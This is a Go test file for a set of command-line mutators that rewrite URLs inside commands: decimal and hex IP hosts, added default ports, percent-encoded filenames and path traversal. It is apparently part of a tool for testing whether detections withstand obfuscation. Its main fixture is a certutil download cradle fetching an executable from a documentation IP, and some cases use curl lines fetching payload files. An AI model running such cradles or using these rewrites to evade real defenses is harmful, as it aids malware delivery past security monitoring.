package mutate

import (
	"strings"
	"testing"
)

// netCase is one mutator applied to one value. want is the exact expected output;
// an empty want means the mutator must decline (return no results).
type netCase struct {
	name  string
	mut   Mutator
	value string
	want  string
}

// A realistic download cradle, reused across the table.
const netCradle = "certutil.exe -urlcache -f http://198.51.100.10/a.exe out"

func TestNetworkMutators(t *testing.T) {
	cases := []netCase{
		// --- ip-decimal ---
		{
			name:  "ip-decimal rewrites the cradle host",
			mut:   ipDecimal{},
			value: netCradle,
			want:  "certutil.exe -urlcache -f http://3325256714/a.exe out",
		},
		{
			name:  "ip-decimal on loopback",
			mut:   ipDecimal{},
			value: "curl http://127.0.0.1:8080/x",
			want:  "curl http://2130706433:8080/x",
		},
		{
			name:  "ip-decimal declines a named host",
			mut:   ipDecimal{},
			value: "curl http://example.com/a.exe",
		},
		{
			name:  "ip-decimal declines an octal-looking octet",
			mut:   ipDecimal{},
			value: "curl http://010.1.1.1/a.exe",
		},
		{
			name:  "ip-decimal declines a benign command",
			mut:   ipDecimal{},
			value: `C:\Windows\System32\whoami.exe /all`,
		},

		// --- ip-hex ---
		{
			name:  "ip-hex rewrites the cradle host",
			mut:   ipHex{},
			value: netCradle,
			want:  "certutil.exe -urlcache -f http://0xc633640a/a.exe out",
		},
		{
			name:  "ip-hex zero-pads to eight digits",
			mut:   ipHex{},
			value: "curl https://127.0.0.1/x",
			want:  "curl https://0x7f000001/x",
		},
		{
			name:  "ip-hex declines a benign command",
			mut:   ipHex{},
			value: "net use \\\\share\\c$",
		},

		// --- url-default-port ---
		{
			name:  "default-port adds :80 to the cradle",
			mut:   urlDefaultPort{},
			value: netCradle,
			want:  "certutil.exe -urlcache -f http://198.51.100.10:80/a.exe out",
		},
		{
			name:  "default-port adds :443 for https",
			mut:   urlDefaultPort{},
			value: "curl https://example.com/a.exe",
			want:  "curl https://example.com:443/a.exe",
		},
		{
			name:  "default-port keeps userinfo ahead of the host",
			mut:   urlDefaultPort{},
			value: "curl http://bob@example.com/a",
			want:  "curl http://bob@example.com:80/a",
		},
		{
			name:  "default-port declines when a port is already explicit",
			mut:   urlDefaultPort{},
			value: "curl http://example.com:8080/a.exe",
		},
		{
			name:  "default-port declines a benign command",
			mut:   urlDefaultPort{},
			value: "powershell.exe -NoProfile -Command Get-Process",
		},

		// --- url-percent-encode ---
		{
			name:  "percent-encode reshapes the cradle filename",
			mut:   urlPercentEncode{},
			value: netCradle,
			want:  "certutil.exe -urlcache -f http://198.51.100.10/%61%2Eexe out",
		},
		{
			name:  "percent-encode leaves the query untouched",
			mut:   urlPercentEncode{},
			value: "curl http://example.com/dl/payload.dll?id=a.b",
			want:  "curl http://example.com/dl/%70ayload%2Edll?id=a.b",
		},
		{
			name:  "percent-encode declines a path ending in a separator",
			mut:   urlPercentEncode{},
			value: "curl http://example.com/dl/",
		},
		{
			name:  "percent-encode declines a bare host",
			mut:   urlPercentEncode{},
			value: "curl http://example.com",
		},
		{
			name:  "percent-encode declines a benign command",
			mut:   urlPercentEncode{},
			value: "reg.exe query HKLM\\Software",
		},

		// --- url-path-traversal ---
		{
			name:  "traversal wraps the cradle filename",
			mut:   urlPathTraversal{},
			value: netCradle,
			want:  "certutil.exe -urlcache -f http://198.51.100.10/temp/../a.exe out",
		},
		{
			name:  "traversal goes before the last segment only",
			mut:   urlPathTraversal{},
			value: "curl http://example.com/a/b/c.exe?q=1",
			want:  "curl http://example.com/a/b/temp/../c.exe?q=1",
		},
		{
			name:  "traversal declines a bare host",
			mut:   urlPathTraversal{},
			value: "curl http://example.com",
		},
		{
			name:  "traversal declines a root path",
			mut:   urlPathTraversal{},
			value: "curl http://example.com/",
		},
		{
			name:  "traversal declines a benign command",
			mut:   urlPathTraversal{},
			value: "rundll32.exe shell32.dll,Control_RunDLL",
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := tc.mut.Apply(tc.value)
			if tc.want == "" {
				if len(got) != 0 {
					t.Fatalf("%s: expected no results, got %+v", tc.mut.Name(), got)
				}
				return
			}
			if len(got) != 1 {
				t.Fatalf("%s: expected 1 result, got %d: %+v", tc.mut.Name(), len(got), got)
			}
			if got[0].Value != tc.want {
				t.Errorf("%s:\n got %q\nwant %q", tc.mut.Name(), got[0].Value, tc.want)
			}
			if got[0].Value == tc.value {
				t.Errorf("%s produced a no-op result", tc.mut.Name())
			}
			if got[0].Note == "" {
				t.Errorf("%s produced a result with no note", tc.mut.Name())
			}
		})
	}
}

// The decimal form is the whole point of ip-decimal, so pin the arithmetic rather
// than trusting the end-to-end string.
func TestNetParseIPv4(t *testing.T) {
	cases := []struct {
		host string
		want uint32
		ok   bool
	}{
		{"127.0.0.1", 2130706433, true},
		{"198.51.100.10", 3325256714, true},
		{"0.0.0.0", 0, true},
		{"255.255.255.255", 4294967295, true},
		{"1.2.3", 0, false},
		{"1.2.3.4.5", 0, false},
		{"256.1.1.1", 0, false},
		{"01.2.3.4", 0, false}, // leading zero may be read as octal
		{"example.com", 0, false},
		{"1.2.3.a", 0, false},
		{"", 0, false},
	}
	for _, tc := range cases {
		got, ok := netParseIPv4(tc.host)
		if ok != tc.ok || got != tc.want {
			t.Errorf("netParseIPv4(%q) = %d, %v; want %d, %v", tc.host, got, ok, tc.want, tc.ok)
		}
	}
}

// url-default-port must touch the authority and nothing else: exactly one ":80",
// sitting immediately after the host.
func TestDefaultPortInsertedOnlyAfterHost(t *testing.T) {
	got := urlDefaultPort{}.Apply(netCradle)
	if len(got) != 1 {
		t.Fatalf("expected 1 result, got %d", len(got))
	}
	v := got[0].Value
	if n := strings.Count(v, ":80"); n != 1 {
		t.Errorf("expected exactly one :80, got %d in %q", n, v)
	}
	if !strings.Contains(v, "http://198.51.100.10:80/a.exe") {
		t.Errorf("port not inserted directly after the host: %q", v)
	}
	// Everything outside the URL must survive byte for byte.
	if !strings.HasPrefix(v, "certutil.exe -urlcache -f ") || !strings.HasSuffix(v, " out") {
		t.Errorf("mutation leaked outside the URL token: %q", v)
	}
}

func TestNetworkMutatorsSkipOpaquePayload(t *testing.T) {
	payload := "SQBFAFgAKAB0AGUAcwB0ACkAaHR0cDovLzEyNy4wLjAuMS9h"
	for _, m := range netMutators() {
		if got := m.Apply(payload); len(got) != 0 {
			t.Errorf("%s reshaped an opaque payload: %+v", m.Name(), got)
		}
	}
}

func TestNetworkMutatorsAreDeterministic(t *testing.T) {
	value := "certutil.exe -urlcache -f http://198.51.100.10/dl/a.exe?k=1 out"
	for _, m := range netMutators() {
		first := m.Apply(value)
		for i := 0; i < 5; i++ {
			again := m.Apply(value)
			if len(again) != len(first) {
				t.Fatalf("%s: result count varies between runs", m.Name())
			}
			for j := range again {
				if again[j] != first[j] {
					t.Fatalf("%s: output varies between runs: %+v vs %+v", m.Name(), first, again)
				}
			}
		}
	}
}

func TestNetworkMutatorsRegistered(t *testing.T) {
	inCatalog := map[string]bool{}
	for _, m := range Catalog() {
		inCatalog[m.Name()] = true
	}
	for _, m := range netMutators() {
		if !inCatalog[m.Name()] {
			t.Errorf("%s is not registered in the catalog", m.Name())
		}
		if m.Technique() == "" || m.Describe() == "" || m.Remediation() == "" {
			t.Errorf("%s is missing metadata", m.Name())
		}
	}
}

func netMutators() []Mutator {
	return []Mutator{ipDecimal{}, ipHex{}, urlDefaultPort{}, urlPercentEncode{}, urlPathTraversal{}}
}
